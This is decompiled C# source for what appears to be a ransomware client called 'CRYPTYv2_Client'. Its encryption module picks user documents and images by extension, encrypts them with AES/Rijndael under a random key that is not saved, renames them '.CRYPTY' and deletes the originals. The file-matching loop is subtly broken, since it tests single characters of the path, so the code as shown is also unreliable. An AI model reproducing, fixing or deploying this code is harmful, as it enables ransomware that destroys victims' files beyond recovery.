using System;
using System.IO;
using System.Security.Cryptography;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[StandardModule]
internal sealed class Encryption
{
	private enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private static Random r = new Random();

	private static object randomKey = r.Next(1000000000, 1999999999);

	private static string strFileToEncrypt;

	private static string strFileToDecrypt;

	private static string strOutputEncrypt;

	private static string strOutputDecrypt;

	private static FileStream fsInput;

	private static FileStream fsOutput;

	private static string txtDestinationEncrypt;

	private static string txtDestinationDecrypt;

	private static string txtFileToEncrypt;

	private static string txtFileToDecrypt;

	public static void EncryptPath(string path)
	{
		checked
		{
			try
			{
				for (int i = 0; i < path.Length; i++)
				{
					string text = Conversions.ToString(path[i]);
					if (text.ToLower().EndsWith(".docx") | text.ToLower().EndsWith(".txt") | text.ToLower().EndsWith(".rtf") | text.ToLower().EndsWith(".xls") | text.ToLower().EndsWith(".ppt") | text.ToLower().EndsWith(".odt") | text.ToLower().EndsWith(".bmp") | text.ToLower().EndsWith(".gif") | text.ToLower().EndsWith(".jpeg") | text.ToLower().EndsWith(".jpg") | text.ToLower().EndsWith(".psd") | text.ToLower().EndsWith(".png") | text.ToLower().EndsWith(".tiff") | text.ToLower().EndsWith(".pdf"))
					{
						strFileToEncrypt = Path.GetFullPath(text);
						txtFileToEncrypt = strFileToEncrypt;
						int num = 0;
						int startIndex = 0;
						while (strFileToEncrypt.IndexOf('\\', startIndex) != -1)
						{
							num = strFileToEncrypt.IndexOf('\\', startIndex);
							startIndex = num + 1;
						}
						strOutputEncrypt = strFileToEncrypt.Substring(num + 1);
						string text2 = strFileToEncrypt.Substring(0, num + 1);
						strOutputEncrypt = strOutputEncrypt.Replace('.', '_');
						txtDestinationEncrypt = text2 + strOutputEncrypt + ".CRYPTY";
						Encrypt();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private static byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	private static void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
			fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
			fsOutput.SetLength(0L);
			byte[] buffer = new byte[4097];
			long num = 0L;
			long length = fsInput.Length;
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = default(CryptoStream);
			switch (Direction)
			{
			case CryptoAction.ActionDecrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			case CryptoAction.ActionEncrypt:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
				break;
			}
			int num2;
			for (; num < length; num = checked(num + num2))
			{
				num2 = fsInput.Read(buffer, 0, 4096);
				cryptoStream.Write(buffer, 0, num2);
			}
			cryptoStream.Close();
			fsInput.Close();
			fsOutput.Close();
			if (Direction == CryptoAction.ActionEncrypt)
			{
				FileInfo fileInfo = new FileInfo(strFileToEncrypt);
				fileInfo.Delete();
			}
			if (Direction == CryptoAction.ActionDecrypt)
			{
				FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
				fileInfo2.Delete();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			fsInput.Close();
			fsOutput.Close();
			if (Direction == CryptoAction.ActionDecrypt)
			{
				FileInfo fileInfo3 = new FileInfo(txtDestinationDecrypt);
				fileInfo3.Delete();
				Interaction.MsgBox((object)"Please check to make sure that you entered the correctpassword.", (MsgBoxStyle)48, (object)"Invalid Password");
			}
			else
			{
				FileInfo fileInfo4 = new FileInfo(txtDestinationEncrypt);
				fileInfo4.Delete();
				Interaction.MsgBox((object)"This file cannot be encrypted.", (MsgBoxStyle)48, (object)"Invalid File");
			}
			ProjectData.ClearProjectError();
		}
	}

	private static void Encrypt()
	{
		byte[] bytKey = CreateKey(Conversions.ToString(randomKey));
		byte[] bytIV = CreateIV(Conversions.ToString(randomKey));
		EncryptOrDecryptFile(strFileToEncrypt, txtDestinationEncrypt, bytKey, bytIV, CryptoAction.ActionEncrypt);
	}

	private static void Decrypt()
	{
		byte[] bytKey = CreateKey(Conversions.ToString(randomKey));
		byte[] bytIV = CreateIV(Conversions.ToString(randomKey));
		EncryptOrDecryptFile(strFileToDecrypt, txtDestinationDecrypt, bytKey, bytIV, CryptoAction.ActionDecrypt);
	}
}
